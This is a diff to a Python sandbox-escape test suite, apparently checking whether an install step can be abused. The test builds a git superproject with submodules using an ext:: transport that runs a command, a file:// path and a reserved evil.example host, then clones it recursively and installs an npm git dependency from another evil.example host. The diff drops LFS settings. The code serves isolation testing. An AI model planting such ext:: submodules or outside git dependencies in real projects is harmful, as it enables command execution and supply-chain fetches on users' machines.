@@ -695,9 +695,9 @@ def case_output_flood(nonce, gw, canary):
 
 
 # install-git-submodule: a superproject whose submodules point at an ext:: transport (which would
-# run a command of ours), a file:// path, and an outside host, with LFS settings pointing outside
-# too; cloned with --recurse-submodules the way an install that fetches a git dependency would,
-# and an npm git dependency on the outside host. Every outside host is reserved (.example).
+# run a command of ours), a file:// path, and an outside host, cloned with --recurse-submodules the
+# way an install that fetches a git dependency would, and an npm git dependency on another outside
+# host. Every outside host is reserved (.example). No LFS: git-lfs is not in the node*-build images.
 def git(args, cwd, timeout=60):
     env = {**os.environ, "GIT_TERMINAL_PROMPT": "0", "GIT_AUTHOR_NAME": "isk", "GIT_AUTHOR_EMAIL": "isk@example.invalid",
            "GIT_COMMITTER_NAME": "isk", "GIT_COMMITTER_EMAIL": "isk@example.invalid"}
@@ -728,29 +728,23 @@ def case_install_git_submodule(nonce, gw, canary):
         f.write(f'[submodule "file"]\n\tpath = file\n\turl = file://{src}\n'
                 f'[submodule "ext"]\n\tpath = ext\n\turl = ext::{marker} %S\n'
                 f'[submodule "http"]\n\tpath = http\n\turl = https://sub.evil.example/isk-{nonce}.git\n')
-    with open(f"{sup}/.gitattributes", "w") as f:
-        f.write("*.bin filter=lfs diff=lfs merge=lfs -text\n")
-    with open(f"{sup}/.lfsconfig", "w") as f:
-        f.write(f"[lfs]\n\turl = https://lfs.evil.example/isk-{nonce}.git/info/lfs\n")
-    with open(f"{sup}/big.bin", "w") as f:
-        f.write("version https://git-lfs.github.com/spec/v1\noid sha256:" + "a" * 64 + "\nsize 1048576\n")
+    with open(f"{sup}/README", "w") as f:
+        f.write("superproject\n")
     # The gitlinks go in by hand (no folder of theirs in the work tree), so the other files are added
     # by name: `git add .` would take the gitlinks out again as deleted.
     for path in ("file", "ext", "http"):
         steps.append(git(["update-index", "--add", "--cacheinfo", f"160000,{head},{path}"], sup))
-    steps += [git(["add", ".gitmodules", ".gitattributes", ".lfsconfig", "big.bin"], sup), git(["commit", "-qm", "super"], sup)]
+    steps += [git(["add", ".gitmodules", "README"], sup), git(["commit", "-qm", "super"], sup)]
     listed = git(["ls-tree", "HEAD"], sup).get("out", "")
     clone = f"/work/clone-{nonce}"
     cl = git(["clone", "--recurse-submodules", sup, clone], "/tmp", timeout=90)
-    lfs = git(["lfs", "version"], "/tmp", timeout=10)
-    lfs_pull = git(["lfs", "pull"], clone, timeout=30) if lfs.get("exit") == 0 and os.path.isdir(clone) else None
     try:
         r = subprocess.run(["npm", "install", "--prefix", f"/tmp/npm-{nonce}", "--no-audit", "--no-fund", "--ignore-scripts",
                             f"git+https://npm.evil.example/isk-npm-{nonce}.git"], capture_output=True, timeout=60)
         npm = {"exit": r.returncode, "err": r.stderr.decode(errors="replace")[-200:]}
     except Exception as e:  # noqa: BLE001
         npm = {"error": type(e).__name__}
-    return {"setup": [x for x in steps if x.get("exit") not in (0, None) or x.get("error")][:6], "gitlinks": listed.count("160000"), "clone": cl, "lfs": lfs, "lfs_pull": lfs_pull, "npm": npm,
+    return {"setup": [x for x in steps if x.get("exit") not in (0, None) or x.get("error")][:6], "gitlinks": listed.count("160000"), "clone": cl, "npm": npm,
             "cloned": os.path.isdir(f"{clone}/.git"), "file_followed": os.path.exists(f"{clone}/file/isk-file-{nonce}"),
             "ext_ran": os.path.exists(f"/work/isk-ext-ran-{nonce}")}
 
